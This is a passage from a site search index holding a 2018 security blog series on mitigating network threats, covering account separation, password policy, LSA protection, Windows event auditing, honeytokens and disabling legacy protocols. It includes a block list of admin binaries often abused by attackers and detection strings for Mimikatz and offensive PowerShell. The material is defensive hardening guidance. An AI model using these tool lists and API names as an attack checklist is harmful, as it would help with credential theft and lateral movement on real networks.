\"Type 7\" on the network. You may be amazed at what is discovered.</p>"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#ports-protocols-and-services","title":"Ports, Protocols, and Services","text":"<p>Ports, protocols and services (PPS) are simply the technical means by which networks communicate.</p>"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#observations_6","title":"Observations","text":"<p>In every network evaluated, PPS were not limited to only those required. This applies to internal as much as external communications. Many organizations rely on firewalls to limit specific ports and protocols from external sources; however, they have limited controls on what PPS traverse the internal network. Even when internal firewalls are in place, traffic is often not restricted appropriately.</p>"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#recommendation-block-and-disable-non-required-ports-protocols-and-services-pps","title":"Recommendation: Block and Disable non-required ports, protocols, and services (PPS)","text":"<p>Both internal and external systems and network devices should block PPS that aren't required for the network. Limit PPS to only what is required for each specific system. Think of this as \"PPS white-listing\". Does the network have a need for port 5900 to traverse the entire network? Or is there a need for port 5900 to a specific system? Does the network really need IPX/SPX, WPAD, LLMNR, and NetBIOS enabled? Controlling PPS limits a threat's range of capabilities and increases chances of detection.</p> <p>Note</p> <p>Firewalls (network or host based) are listed above as an easy example. Network based firewalls are simply traffic control devices that allow ingress and egress traffic based upon configuration. Host based firewalls do the same for individual hosts.</p>"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#accounts-and-privileges","title":"Accounts and privileges","text":"<p>Accounts, group memberships, and privileges are primary enablers for most threat actions. Effective management and control greatly limits a threat's ability to execute within a network.</p>"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#observations_7","title":"Observations","text":"<p>Many organizations have user accounts with some level of elevated access, administrative accounts that administer multiple resource types, and groups with specific permissions nested within other groups with higher level permissions. Each of these enable a threat to freely escalate privileges to a level required to meet their objective.</p> <p>Consider this Concept</p> <p>A threat has the ability to elevate a standard user to one of privileged access, elevate a privileged access account to local administrator, and/or elevate local administrator to domain administrator. If a threat has the ability to escalate a standard user account to that of DA, so does every other user on the network.</p>"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#recommendation-1-implement-separation-of-accounts-and-privileges","title":"Recommendation 1: Implement separation of accounts and privileges","text":"<p>Ensure separation of user, privileged access, and administrator accounts. Also ensure administrative accounts can only administer within its area of responsibility. System administrators should only administer systems and not have access to servers. Server administrators should only be able to administer servers and not have access to workstations. Domain administrators should not have access to administer servers or workstations.</p> <p>Users should be limited to only what is required to perform daily tasks. Standard users often do not require elevated privileges on a daily basis. In rare scenarios where a user needs elevation often, require the use of a secondary account with only the access required and no external communications ability. Likewise, administrators shouldn't be using elevated accounts for daily tasks. As a general rule all elevated accounts should be restricted from external communications (including internet and email).</p> <p>Also, consider having separate dedicated administrative systems with no email client, Internet browser, timecard access, document editing, any external communication, etc.</p>"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#recommendation-2-ensure-group-permissions-are-appropriately-identified-and-mapped","title":"Recommendation 2: Ensure group permissions are appropriately identified and mapped.","text":"<p>This recommendation has multiple applications; however, the main focus is nested groups and permissions. Nesting is a common problem in nearly every windows based-network in existence. Is it easier to troubleshoot permissions or give a user membership to a group to solve the problem? We've all been there.</p> <p>Consider this Concept</p> <p>Group 3 has domain access. Group 2 has server access. Group 1 has workstation access. Group 0 are domain users in a specific division. If a member of Group 0 is assigned to Group 1 due to an elevation requirement, the chances of that user being able to escalate to domain administrator (Group 3) are high. This occurs simply because at least one member of Group 1 is likely a member of Group 2, and at least one member of Group 2 is likely a member of Group 3. It may require a bit of work, but these are the paths and nested permissions a threat will leverage to gain elevated access.</p>"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#recommendation-3-implement-microsoft-local-administrator-password-solution-laps","title":"Recommendation 3: Implement Microsoft Local Administrator Password Solution (LAPS)","text":"<p>LAPS provides automated local administrator account management for every computer in Active Directory. A client-side component generates a random password, updates the LAPS password on the Active Directory computer account, and sets the password locally. LAPS configuration is managed through Group Policy which provides the values for password complexity, password length, local account name for password change, password change frequency, etc.</p>"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#recommendation-4-rudimentary-nix-two-factor-authentication-2fa","title":"Recommendation 4: Rudimentary *nix Two Factor Authentication (2FA)","text":"<p>Many organizations have issues with credential reuse and implementation of Two Factor Authentication (2FA) in *nix based systems especially in off-line or closed networks. A very rudimentary but simple implementation of 2FA is the use of ssh key-files. The user generates a key-file that requires a password for use. The system administrator configures the system to require a key and password. The user now must use the password protected key-file to connect and the system password to complete authentication.</p>"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#account-and-event-activity","title":"Account and Event Activity","text":"<p>Account and event activity should be major factors in identifying potential issues or threats within a network. Unfortunately, these are often logged but rarely monitored effectively.</p>"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#observations_8","title":"Observations","text":"<p>Account and event activity collection is commonly identified as a compliance item and treated as a box to be checked. Multiple organizations have successfully configured logging and event forwarding and have alerts to match each event. Yet a common issue discovered in every organization to date is the unreasonable number of notifications or alerts received. Defensive staff are unable to follow every thread to a root cause due to time constraints and the vast number of alerts received. If a dedicated defensive team is unable to run every alert to ground, the alerts, logging, and collection has not been appropriately configured and tuned.</p>"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#recommendation-1-monitor-login-failures-and-successes","title":"Recommendation 1: Monitor login failures and successes","text":"<p>Short and simple. Multiple fails followed by a success indicates bad things. Many organizations focus on the failures and only respond when a target number of failures occur (i.e. three failed attempts per account or 300 failed attempts total).</p> <p>Consider this Concept</p> <p>A threat has a password discovered via open source intelligence. The account is unknown; however, the password file has a recent date. The threat performs one validation per account for all accounts on the network (or Outlook Web Access or external SharePoint Portal). After twenty attempts one account has the same password and successfully authenticates. This action met neither of the conditions for alerting. Would this action be identified?</p>"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#recommendation-2-consider-implementing-a-second-instance-or-dashboard-or-properly-tuning-the-primary","title":"Recommendation 2: Consider implementing a second instance or dashboard (or properly tuning the primary)","text":"<p>Given that most organizations have a compliance requirement to log all events, it is unreasonable to discard all incoming data. It is feasible to tune the primary or a second instance, dashboard, etc. to look specifically for the indicators as described above.</p> <p>Example: The network has been configured to prevent client-to-client communications. If client-to-client communications are attempted, an alert provides notification.</p> <p>!!! Note: The example action should occur for the eight or ten actions common to most threats. Eight or ten possible scenarios are much easier to monitor and maintain and provide a realistic view of potential threats (outsider or insider) within the network.</p>"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#application-whitelisting","title":"Application Whitelisting","text":"<p>Application Whitelisting is the process of identifying approved software, allowing only those applications to run on a system, and blocking all others.</p>"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#observations_9","title":"Observations","text":"<p>Application Whitelisting is extremely useful in securing a network; however, for any organization with a larger footprint, dispersed locations and a diverse set of business requirements; it can be cumbersome to configure and maintain. In addition, many Application Whitelisting tools and techniques have been bypassed or leveraged to execute malicious code and security researchers continue to discover new ways of doing so. Application Whitelisting provides some value to the overall security of a network, but isn't the silver bullet everyone expects. Combined with other recommendations Application Whitelisting provides an exponential increase in time and difficulty to a threat.</p>"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#recommendation-application-whitelisting","title":"Recommendation: Application Whitelisting","text":"<p>Implement Application Whitelisting only after all of the prior recommendations have been implemented. An interim strategy (until Application Whitelisting can be fully implemented) may be to prevent standard user execution of specific applications such as: arp, at, certutil, cscript, cmd, dsquery, hostname, ipconfig, msbuild, nbtstat, net, netsh, netstat, nslookup, ntdsutil, pcalua, ping, powershell, psexec, reg, regasm, regedit, regedt32, regsvr32, regsvcs, rundll32, set, sc, schtasks, systeminfo, tasklist, tracert, whoami, wmic, wscript, wsmprovhost, etc.</p> Do standard users normally run any of the preceding commands? Should they? <p>Most users do not use these commands. If they do, why?</p> <p>Most organizations have historically focused on prevention (which is why we consistently see networks with a harder exterior and soft chewy center). While prevention is a huge concern, complete protection will never be possible. Although preventative in nature, the major benefit of the listed recommendations is relative ease of detection. Each activity performed outside the baseline should stand out as indicators of malicious activity.</p> <p>My closing recommendation is for all organizations and security professionals to adopt the concept of \"Assumed Breach\". An Assumed Breach mentality accepts that a network is currently, or will eventually be, compromised. Prepare your networks and business functions as if there's a known or impending threat to the network. I'll expand more on this in future posts.</p> If a standard user was given administrative credentials while sitting at their workstation, what could they do? <p>What did you come up with? Should a user be able to perform those actions?</p> <p>Refer to Part 2 for detailed technical implementation.</p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/","title":"Threat Mitigation Strategies: Part 2","text":"<p>James Tubberville | May 15, 2018 | Tweet This Post: </p> <p>The following information was composed by Andrew Chiles (@andrewchiles), Joe Vest (@joevest) and myself (@minis_io) for quick and easy reference. Much of it was pulled together from a variety of sources with attempts to provide references for each. This post is intended to be more of a brain dump rather than a complete technical breakout.</p> <p></p> <p>As discussed in the Threat Mitigation Strategies Part 1 http://threatexpress.com/blogs/2018/threat-mitigation-strategies-observations-recommendations/, there is commonality between the inherent weaknesses and the actions a threat might perform within an information system or network. The following recommendations and informational snippets were derived from many offensive and defensive efforts that continue to support these correlations. Each recommendation and snippet can and very likely should be applied to all networks. Some systems and networks will have exceptions; however, these are exceptions (not the status quo) and should be handled as such. Also note the exact syntax and use will vary with the network construct, operating system/version, and legal/regulatory security requirements.</p> <p>Note</p> <p>Technical recommendations within this blog entry will be periodically updated on ThreatExpress' GitHub</p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#account-management","title":"Account Management","text":"<p>Accounts should have specific roles.</p> <p>General Guidelines</p> <ul> <li>Domain Administrators perform management of Windows Active Directory. They do not manage servers or workstations.</li> <li>Server Administrators perform management of servers. They do not manage workstations.</li> <li>Workstation Administrators perform management of workstation. They do not manage servers.</li> <li>Privileged accounts should NOT have external communications (Internet, email, etc.)</li> <li>Standard users should NOT have elevated access (use secondary accounts if required)</li> </ul>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#adjust-password-policy","title":"Adjust Password Policy","text":"<p>Adjust password policy to conform to \"800-63-3: Digital Identity Guidelines\".</p> <ul> <li>Remove periodic password change requirements</li> <li>Passwords should only be changed if forgotten or suspected compromise</li> </ul> <p>Warning</p> <p>I don't agree with the two above and recommend maintaining a reasonable duration for password change requirements</p> <ul> <li>Remove complexity requirements (Upper/Lower/Number/Special character)</li> <li>Require a minimum password length of</li> <li>A minimum length of 8 is required by NIST, but minimum of 16 is recommended for user accounts</li> <li>A minimum length of 20 (28+ is recommended) for service accounts</li> <li>Suggest the use of pass-phrases (such as four random lowercase words). Example: \"correct horse battery staple!\"</li> <li>Screen passwords against password compromise lists</li> <li>Screen passwords against keyboard walks</li> </ul> <p>Note</p> <p>Meeting the complexity recommendation may not be possible due to current compliance requirements.</p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#setting-the-password-policy-using-gpo","title":"Setting the Password Policy using GPO","text":"<p>Edit the \"Domain Password Policy\" GPO to configure the appropriate password length</p> <pre><code>1. Open Group Policy\n2. Computer Configurations &gt; Policies &gt; Windows Settings &gt; Security Settings &gt; Account Policy &gt; Password Policy\n3. Minimum password length: 20\n</code></pre>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#krbtgt-password-reset","title":"KRBTGT password reset","text":"<p>Regularly reset the KRBTGT password to minimize stolen credentials from be used in the future.</p> <pre><code>Review the reset tool guide \"Guide to Running New-CtmADKrbtgtKeys\" (see references)\nUse the the PowerShell script New-CtmADKrbtgtKeys.ps1 to reset the KRBTGT\nWait 24 hours and execute the change a 2nd time\nRecommend running on a regular schedule. This should be monthly, quarterly (at most), or after an incident where compromise is suspected.\n</code></pre> <p>References</p> <ul> <li>https://gallery.technet.microsoft.com/Reset-the-krbtgt-account-581a9e51</li> <li>https://adsecurity.org/?p=483</li> </ul>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#use-laps-to-manage-the-local-administrator-rid-500-password","title":"Use LAPS to manage the local Administrator (RID 500) password","text":"<ul> <li>Install KB2871997</li> <li>Follow details outlined at https://adsecurity.org/?p=1790</li> </ul> <p>References</p> <ul> <li>https://adsecurity.org/?p=1790</li> <li>https://adsecurity.org/?p=559</li> </ul>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#implement-managed-service-accounts","title":"Implement Managed Service Accounts","text":"<p>Windows Server 2008 R2 and Windows 7 introduced Managed Service Accounts. MSA's allow you to create an account in Active Directory that is tied to a specific computer. That account has its own complex password (see password policy) and is maintained automatically. This means that an MSA can run services on a computer in a secure and easy to maintain manner, while maintaining the capability to connect to network resources as a specific user principal.</p> <p>Group level MSA's can be deployed in Windows 2012 or higher Domains.</p> <p>Reference</p> <ul> <li>https://blogs.technet.microsoft.com/askds/2009/09/10/managed-service-accounts-understanding-implementing-best-practices-and-troubleshooting/</li> <li>https://technet.microsoft.com/en-us/library/hh831782.aspx</li> </ul>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#protected-lsa","title":"Protected LSA","text":""},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#protect-lsa-via-policy","title":"Protect LSA Via policy","text":"<pre><code>1. Advanced Audit Policy Configuration &gt; Object Access &gt; Audit Kernel Object\n2. Enable SACL L\"S:(AU;SAFA;0x0010;;;WD)\"\n</code></pre> <p>and</p> <pre><code>1. Computer Configuration &gt; Preferences &gt; Windows Settings\n2. Right-click Registry &gt; New &gt; Registry Item\n3. Hive HKLM &gt; Path SYSTEMCurrentControlSetControlLsa\n4. DWORD value RunAsPPL=00000001\n</code></pre> <p>Note</p> <p>LSA Protection prevents non-protected processes from interacting with LSASS. Mimikatz can still bypass this with a driver (\"!+\").</p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#protect-lsa-via-registry-entry","title":"Protect LSA Via Registry Entry","text":"<p><code>Manually create registry entry HKEY_LOCAL_MACHINESystemCurrentControlSetControlLsa DWORD RunAsPPL=00000001</code></p> <p>or</p> <p><code>reg add HKEY_LOCAL_MACHINESystemCurrentControlSetControlLsa /v RunAsPPL /d 00000001 /t REG_DWORD</code></p> <p>Windows Event Forwarding (WEF) reads any operational or administrative event log on a device in your organization and forwards the events you choose to a Windows Event Collector (WEC) server.</p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#windows-logs","title":"Windows Logs","text":"<p>The Windows Logs category includes the logs that were available on previous versions of Windows: the Application, Security, and System logs. It also includes two new logs: the Setup log and the ForwardedEvents log. Windows logs are intended to store events from legacy applications and events that apply to the entire system.</p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#application-log","title":"Application log","text":"<p>The Application log contains events logged by applications or programs. For example, a database program might record a file error in the application log. Program developers decide which events to log.</p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#security-log","title":"Security log","text":"<p>The Security log contains events such as valid and invalid logon attempts, as well as events related to resource use, such as creating, opening, or deleting files or other objects. Administrators can specify what events are recorded in the security log. For example, if you have enabled logon auditing, attempts to log on to the system are recorded in the security log.</p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#setup-log","title":"Setup log","text":"<p>The Setup log contains events related to application setup.</p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#system-log","title":"System log","text":"<p>The System log contains events logged by Windows system components. For example, the failure of a driver or other system component to load during startup is recorded in the system log. The event types logged by system components are predetermined by Windows.</p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#forwardedevents-log","title":"ForwardedEvents log","text":"<p>The ForwardedEvents log is used to store events collected from remote computers. To collect events from remote computers, you must create an event subscription. To learn about event subscriptions, see Event Subscriptions.</p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#applications-and-services-logs","title":"Applications and Services Logs","text":"<p>Applications and Services logs are a new category of event logs. These logs store events from a single application or component rather than events that might have system wide impact.</p> <p>This category of logs includes four subtypes: Admin, Operational, Analytic, and Debug logs. Events in Admin logs are of particular interest to IT Professionals using the Event Viewer to troubleshoot problems. Events in the Admin log should provide you with guidance about how to respond to them. Events in the Operational log are also useful for IT Professionals, but they are likely to require more interpretation.</p> <p>Admin and Debug logs are not as user friendly. Analytic logs store events that trace an issue and, often, a high volume of events are logged. Debug logs are used by developers when debugging applications. Both Analytic and Debug logs are hidden and disabled by default. To make these logs visible, follow the steps in Show or Hide Analytic and Debug Logs. To enable these logs, follow the steps in Enable Analytic and Debug Logs.</p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#admin","title":"Admin","text":"<p>These events are primarily targeted at end users, administrators, and support personnel. The events that are found in the Admin channels indicate a problem and a well-defined solution that an administrator can act on. An example of an admin event is an event that occurs when an application fails to connect to a printer. These events are either well documented or have a message associated with them that gives the reader direct instructions of what must be done to rectify the problem.</p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#operational","title":"Operational","text":"<p>Operational events are used for analyzing and diagnosing a problem or occurrence. They can be used to trigger tools or tasks based on the problem or occurrence. An example of an operational event is an event that occurs when a printer is added or removed from a system.</p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#analytic","title":"Analytic","text":"<p>Analytic events are published in high volume. They describe program operation and indicate problems that cannot be handled by user intervention.</p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#debug","title":"Debug","text":"<p>Debug events are used by developers troubleshooting issues with their programs.</p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#advanced-audit-policy-should-focus-on-these-in-no-specific-order","title":"Advanced Audit Policy should focus on these (in no specific order)","text":"<pre><code>1. A logon was attempted using explicit credentials: Event 552 and 4648\n2. A member was added to a security-enabled global group: Event 4728\n3. A member was added to a security-enabled local group: Event 4732\n4. A member was added to a security-enabled universal group: Event 4756\n5. An account failed to log on: Event 529-539 4625 (followed by a success 4624)\n6. LogonAccount/TargetUserName is Administrator (Using RID-500): Event 4624, 4776\n7. Scheduled Task Creation: Event 602, 4698\n8. Log was cleared: Event 104 and 1102, 4949\n9. EMET dies: Event 1 and 2\n10. Application Error or Hang: Event 1000 and 1002\n11. Windows Defender Errors: Event 1005, 1006, 1008, 1010, 2001, 2003, 2004, 3002, 5008\n12. New process: User NOT admin and Event 4688\n(arp, at, bcdedit, certutil, cscript, cmd, dsquery, hostname, ipconfig, msbuild, nbtstat, net, netsh, netstat, nslookup, ntdsutil, pcalua, ping, powershell, psexec, reg, regasm, regedit, regedt32, regsvr32, regsvcs, rundll32, set, sc, schtasks, systeminfo, tasklist, tracert, whoami, wmic, wscript, wsmprovhost)\n13. Service creation/install: Event 601, 4697, 7045\n14. Service changes: Event 7040\n15. File share access/attempts (C$, ADMIN$, IPC$): Event 5140\n16. PowerShell execution and module loading: Event 501 and 4104 respectively\n17. External media detection: All Events 7045, 10000, 10001 or 10002, 10100, 20001, 20003, 24576, 24577, 24579\n18. User creation: Event 4720\n</code></pre> <p>Tip</p> <p>It's a good idea to hide/exclude these events except specific conditions (See caveats above) as these are consistently rolling: 4688,4689,5156,5158</p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#enable-command-line-logging-must-include-ms15-015-kb3031432","title":"Enable Command Line Logging (Must include MS15-015 KB3031432)","text":"<p><code>HKLMSoftwareMicrosoftWindowsCurrentVersionPoliciesSystemAudit DWORD ProcessCreationIncludeCmdLine_Enabled=1</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#account-honeytoken-manual","title":"Account HoneyToken (manual)","text":"<p><code>echo \"crazypassword\" | runas /u:yourdomain.comXadmin /netonly ipconfig</code></p> <p>Consider a check on 4625 where Xadmin is found</p> <p>Also add hash of crazypassword to IDS and alert when seen</p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#account-honeytoken-network","title":"Account HoneyToken (network)","text":"<p><code>Invoke-HoneyCreds.ps1</code></p> <p>Reference: https://github.com/Ben0xA/PowerShellDefense/blob/master/Invoke-HoneyCreds.ps1</p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#spn-honeytoken","title":"SPN HoneyToken","text":"<p><code>Set-ADUser watchaccount -ServicePrincipalNames @{Add=\"MSSQLSvc/sql1:1433\u2033}</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#powershell-module-logging","title":"PowerShell Module Logging","text":"<p>Ensure all Windows systems have PowerShell v3 or newer. Newer versions of PowerShell have better logging features, especially PowerShell v5. This will log all PowerShell activity including all PowerShell modules.</p> <p>Enable PowerShell Module Logging</p> <pre><code>1. Open Group Policy\n2. Computer Configuration &gt; Policies &gt; Administrative Templates &gt; Windows Components &gt; Windows PowerShell\n3. Turn on Module Logging\n4. Enter \"*\" and click OK.`\n</code></pre>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#log-parsing","title":"Log Parsing","text":"<p>If enabled, PowerShell activity will be logged to the Microsoft-Windows-PowerShell/Operational Log. Push or pull these events to a central logging server (via Windows Event Forwarding or similar) or SIEM.</p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#parse-powershell-events-for-the-following-mimikatz-indicators","title":"Parse PowerShell events for the following Mimikatz indicators","text":"<pre><code>\"System.Reflection.AssemblyName\"\n\"System.Reflection.Emit.AssemblyBuilderAccess \"\n\"System.Runtime.InteropServices.MarshalAsAttribute\"\n\"TOKEN_PRIVILEGES\"\n\"SE_PRIVILEGE_ENABLED\"`\n</code></pre>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#detecting-offensive-powershell-tools","title":"Detecting Offensive PowerShell Tools","text":"<p>Many PowerShell offensive tools use the following calls which are logged in PowerShell Module Logging.</p> <pre><code>\"GetDelegateForFunctionPointer\"\n\"System.Reflection.AssemblyName\"\n\"System.Reflection.Emit.AssemblyBuilderAccess\"\n\"System.Management.Automation.WindowsErrorReporting\"\n\"MiniDumpWriteDump\"\n\"TOKEN_IMPERSONATE\"\n\"TOKEN_DUPLICATE\"\n\"TOKEN_ADJUST_PRIVILEGES\"\n\"TOKEN_PRIVILEGES\"`\n</code></pre> <p>Reference</p> <ul> <li>https://github.com/palantir/windows-event-forwarding/tree/master/group-policy-objects</li> <li>https://github.com/iadgov/Event-Forwarding-Guidance/tree/master/Subscriptions/samples</li> <li>https://docs.microsoft.com/en-us/windows/threat-protection/use-windows-event-forwarding-to-assist-in-instrusion-detection</li> <li>https://github.com/MicrosoftDocs/windows-itpro-docs/blob/master/windows/threat-protection/use-windows-event-forwarding-to-assist-in-instrusion-detection.md</li> </ul>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#disable-windows-legacy-typically-unused-features","title":"Disable Windows Legacy &amp; Typically Unused Features","text":"<p>The reference (Securing Windows Workstations: Developing a Secure Baseline) located at https://adsecurity.org/?p=3299 contains a wealth of information to help reduce security risks in a Windows Domain. Key mitigations are highlighted below.</p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#force-group-policy-to-reapply-settings-during-refresh","title":"Force Group Policy to reapply settings during \"refresh\"","text":"<p><code>Computer Configuration&gt;Policies&gt;Administrative Templates&gt;System&gt;Group Policy&gt;Configure security policy processing</code></p> <p>Set to Enabled</p> <p><code>Also check the box for \"Process even if the Group Policy objects have not changed\"</code></p> <p>It's also recommended to configure the same settings for each of the following:</p> <ul> <li>Computer Configuration, Policies, Administrative Templates, System, Group Policy, Configure registry policy processing</li> <li>Computer Configuration, Policies, Administrative Templates, System, Group Policy, Configure scripts policy processing</li> <li>As well as any other policy settings as needed.</li> </ul>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#disable-unneeded-services","title":"Disable Unneeded Services","text":"<p>The document Service-management-WS2016.xlsx contains a list default services, their state, use, and if it is safe to disable.</p> <ul> <li>Review the Services outlined in the document Service-management-WS2016.xlsx</li> <li>Create a list of service to disable, and enforce via GPO</li> </ul>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#disable-net-session-enumeration-netcease","title":"Disable Net Session Enumeration (NetCease)","text":"<p>This hardening process prevents attackers from easily getting some valuable recon information to move laterally within their victim's network.</p> <ul> <li>Run the NetCease PowerShell script on Server</li> <li>Include DCs, Fileservers, or other servers where Session information may be used by and attacker for enumeration</li> </ul> <p>References</p> <ul> <li>https://gallery.technet.microsoft.com/Net-Cease-Blocking-Net-1e8dcb5b</li> <li>https://adsecurity.org/?p=3299</li> </ul>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#disable-wpad","title":"Disable WPAD","text":"<p>Web Proxy Auto-Discovery Protocol (WPAD) is \"a method used by clients to locate the URL of a configuration file using DHCP and/or DNS discovery methods. Once detection and download of the configuration file is complete, it can be executed to determine the proxy for a specified URL.\"</p> <p>Disable WPAD via Group Policy by deploying the following registry change:</p> <p><code>HKEY_CURRENT_USERSoftwareMicrosoftWindowsCurrentVersionInternet SettingsWpad New DWORD (32-Bit Value) called \"WpadOverride\" and set to \"1\"</code></p> <p>Disable the service \"WinHTTP Web Proxy Auto-Discovery Service\"</p> <p><code>Computer Configuration&gt;Policies&gt;Windows Settings&gt;Security Settings&gt;System Services Set WinHTTP Web Proxy Auto-Discovery Service to Disabled</code></p> <p>Note: Partial mitigation of WPAD issues is possible by installing the Microsoft patch KB3165191 (MS16-077). This patch hardens the WPAD process and when the system responds to NetBIOS requests.</p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#disable-llmnr","title":"Disable LLMNR","text":"<p>Link-Local Multicast Name Resolution (LLMNR): In a nutshell, Link-Local Multicast Name Resolution (LLMNR) resolves single label names (like: COMPUTER1), on the local subnet, when DNS is unable to resolve the name.</p> <p>Disable LLMNR via Group Policy by deploying the following:</p> <p><code>Group Policy:Computer Configuration/Administrative Templates/Network/DNS Client Set \"Turn Off Multicast Name Resolution\" to \"Enabled\"</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#disable-wdigest","title":"Disable WDigest","text":"<p>WDigest provides support for Digest authentication which is: \"An industry standard that is used in Windows Server 2003 for Lightweight Directory Access Protocol (LDAP) and Web authentication. Digest Authentication transmits credentials across the network as an MD5 hash or message digest.\"</p> <p>Prior to Windows 8.1 and Windows Server 2012 R2, Wdigest was enabled which placed the user's \"clear text\" password in LSASS memory space in order to support basic authentication scenarios. Windows 8.1 and Windows Server 2012 R2 and newer have WDigest disabled by default.</p> <p>Disable WDigest via Group Policy by deploying the following registry change:</p> <p><code>HKEY_LOCAL_MACHINESystemCurrentControlSetControlSecurityProvidersWdigestUseLogonCredential = \"0\"</code></p> <p>References</p> <ul> <li>https://adsecurity.org/?p=3299</li> </ul>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#remove-the-use-of-ntlm-v1","title":"Remove the use of NTLM v1","text":"<p>Windows Server 2008 R2 included features to help identify NTLM authentication use on the network. It is important to completely remove these legacy authentication protocols since they are insecure. Removal and prevention of LM and NTLMv1 use can be activated through the use of Group Policy security settings. Plan to move to NTLMv2 and Kerberos at the least, with the long-term goal being Kerberos only.</p> <ul> <li>Audit the use of NTLM v1 on the network</li> <li>Determine the risks and need to support NTLM v1</li> <li>Disable the use of NTLM v1</li> </ul> <p>Reference</p> <ul> <li>https://technet.microsoft.com/en-us/library/jj865674(v=ws.10).aspx</li> <li>https://technet.microsoft.com/en-us/library/dd560653%28v=ws.10%29.aspx</li> </ul>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#consider-other-mitigations","title":"Consider other Mitigations","text":"<p>Consider other mitigations detailed at https://adsecurity.org/?p=3299</p> <p>References</p> <ul> <li>https://adsecurity.org/?p=3299</li> </ul>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#deploy-security-back-port-patch-kb2871997","title":"Deploy security back-port patch (KB2871997)","text":"<p>Ensure all Windows systems prior to Windows 8.1 &amp; Windows Server 2012 R2 have the KB2871997 patch installed. This patch updates earlier supported versions of Windows with security enhancements baked into Windows 8.1 &amp; Windows Server 2012 R2.</p> <p>References</p> <ul> <li>https://adsecurity.org/?p=559</li> <li>https://blogs.technet.microsoft.com/kfalde/2014/11/01/kb2871997-and-wdigest-part-1/</li> </ul>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#prevent-local-administrator-accounts-from-authenticating-over-the-network","title":"Prevent local \"administrator\" accounts from authenticating over the network","text":"<p>While the local Administrator (RID 500) account on two different computers has a different SID, if they have the same account name and password, the local Administrator account from one can authenticate as Administrator on the other. The same is true with any local account that is duplicated on multiple computers. This presents a security issue if multiple (or all) workstations in an organization have the same account name and password since compromise of one workstation results in compromise of all.</p> <p>Windows 8.1 &amp; Windows 2012 R2 and newer introduced two new local SIDs: S-1-5-113: NT AUTHORITYLocal account S-1-5-114: NT AUTHORITYLocal account and member of Administrators group These SIDs are also added in earlier supported versions of Windows by installing the KB2871997 patch.</p> <p><code>Install patch KB2871997</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#configure-through-group-policy","title":"Configure through Group Policy:","text":"<pre><code>1. Open Group 